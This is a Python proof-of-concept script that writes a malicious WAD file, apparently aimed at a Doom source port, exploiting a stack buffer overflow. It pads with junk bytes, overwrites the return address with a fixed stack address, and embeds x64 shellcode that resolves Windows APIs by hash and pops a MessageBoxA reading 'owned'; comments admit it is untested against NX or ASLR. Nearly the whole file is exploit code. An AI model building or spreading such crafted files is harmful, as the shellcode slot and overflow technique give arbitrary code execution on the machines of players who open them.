#!/usr/bin/python
# -*- coding: utf-8 -*-

#intended effect - MessageBoxA "owned"
###############################
# NOT TESTED WITH NX OR ASLR  #
###############################
#still no exec too :(
#even with $rip=$rsp??

from struct import *

buf =  "PWADx"
buf += bytearray('\x00\x00\x00')
buf += "xx"
buf += bytearray('\x00\x00')
buf += "A" * 32800 #offset of $rsp + some random number lol
buf += pack("<Q", 0x14f1d0) #$rip = $rsp
buf += ("\x48\x83\xe4\xf0\x48\x83\xec\x08\x48\x8b\xec\x48\x8d\x64\x24\xe8\x48\x8d\x05\x21\x02\x00\x00\x48\x89\x45\xe8\x48\x8d\x05")
buf += ("\x1e\x02\x00\x00\x48\x89\x45\xf0\x6a\x00\x8f\x45\xf8\x48\x8d\x05\x16\x02\x00\x00\x48\x8d\x08\x48\x8d\x55\xe8\xe8\x9b\x01")
buf += ("\x00\x00\x48\x8d\x05\x17\x02\x00\x00\x48\x8d\x10\x48\x8d\x05\x0d\x02\x00\x00\x4c\x8d\x00\x33\xc9\x45\x33\xc9\x48\x8d\x64")
buf += ("\x24\xe0\x48\x8d\x05\xdd\x01\x00\x00\xff\x10\x48\x83\xc4\x20\x33\xc9\x48\x8d\x64\x24\xe0\x48\x8d\x15\xc1\x01\x00\x00\xff")
buf += ("\x12\x48\x83\xc4\x20\x53\x56\x57\x41\x54\x55\x48\x8b\xec\x6a\x60\x58\x65\x48\x8b\x00\x48\x8b\x40\x18\x48\x8b\x70\x10\x48")
buf += ("\x8b\x46\x30\x48\x83\xf8\x00\x74\x13\xeb\x08\x4c\x8b\x06\x49\x8b\xf0\xeb\xec\x45\x33\xdb\x66\x45\x33\xd2\xeb\x09\x33\xc0")
buf += ("\xc9\x41\x5c\x5f\x5e\x5b\xc3\x66\x8b\x46\x58\x66\x44\x3b\xd0\x72\x11\xeb\x3c\x66\x45\x8b\xc2\x66\x41\x83\xc0\x02\x66\x45")
buf += ("\x8b\xd0\xeb\xe5\x45\x8b\xcb\x41\xc1\xe9\x0d\x41\x8b\xc3\xc1\xe0\x13\x44\x0b\xc8\x41\x8b\xc1\x4c\x8b\x46\x60\x45\x0f\xb7")
buf += ("\xca\x4d\x03\xc1\x45\x8a\x00\x45\x0f\xbe\xc0\x41\x83\xf8\x61\x72\x15\xeb\x07\x41\x3b\xcb\x74\x16\xeb\x97\x41\x83\xe8\x20")
buf += ("\x41\x03\xc0\x44\x8b\xd8\xeb\xb1\x41\x03\xc0\x44\x8b\xd8\xeb\xa9\x4c\x8b\x56\x30\x41\x8b\x42\x3c\x4d\x8b\xe2\x4c\x03\xe0")
buf += ("\x41\x8b\x84\x24\x88\x00\x00\x00\x4d\x8b\xca\x4c\x03\xc8\x45\x33\xdb\x41\x8b\x41\x18\x44\x3b\xd8\x72\x0b\xe9\x56\xff\xff")
buf += ("\xff\x41\x83\xc3\x01\xeb\xec\x41\x8b\x41\x20\x49\x8b\xda\x48\x03\xd8\x45\x8b\xc3\x48\x8b\xc3\x4a\x8d\x04\x80\x8b\x00\x49")
buf += ("\x8b\xfa\x48\x03\xf8\x33\xc0\x48\x8b\xdf\x48\x83\xc7\x01\x44\x8a\x03\x41\x0f\xbe\xd8\x83\xfb\x00\x74\x02\xeb\x06\x3b\xd0")
buf += ("\x74\x17\xeb\xc1\x44\x8b\xc0\x41\xc1\xe8\x0d\xc1\xe0\x13\x44\x0b\xc0\x44\x03\xc3\x41\x8b\xc0\xeb\xd0\x41\x8b\x41\x1c\x49")
buf += ("\x8b\xd2\x48\x03\xd0\x41\x8b\x41\x24\x4d\x8b\xca\x4c\x03\xc8\x45\x8b\xc3\x49\x8b\xc1\x4a\x8d\x04\x40\x66\x8b\x00\x0f\xb7")
buf += ("\xc8\x48\x8b\xc2\x48\x8d\x04\x88\x8b\x00\x4c\x03\xd0\x49\x8b\xc2\xc9\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x55\x48")
buf += ("\x8b\xec\x48\x8b\xf1\x48\x8b\xfa\x48\x8b\x07\x48\x83\xf8\x00\x74\x0c\x48\x8b\xc6\x48\x83\xc6\x04\x44\x8b\x20\xeb\x07\xc9")
buf += ("\x41\x5c\x5f\x5e\x5b\xc3\x8b\x06\x41\x8b\xcc\x8b\xd0\xe8\x6d\xfe\xff\xff\x48\x8b\xd0\x48\x83\xfa\x00\x74\x02\xeb\x06\x48")
buf += ("\x83\xc7\x08\xeb\xc7\x48\x8b\x07\x48\x8b\xcb\x48\x83\xc3\x01\x48\x8d\x04\xc8\x48\x89\x10\x48\x83\xc6\x04\xeb\xcc\x00\x00")
buf += ("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\xca\x2b\x6e\x7e\xd8\xe2\x73\x06\xe2\xad\x32\xa8\xa2\x4d\xbc")
buf += ("\x00\x00\x00\x00\x6f\x77\x6e\x65\x64\x00")
buf += "A" * 201303 #'fill' the wadfile (this seems to throw off the stack in some cases, see gzdoom-pack-exploit.py)


f = open("exploit.wad", "w")
f.write(buf)


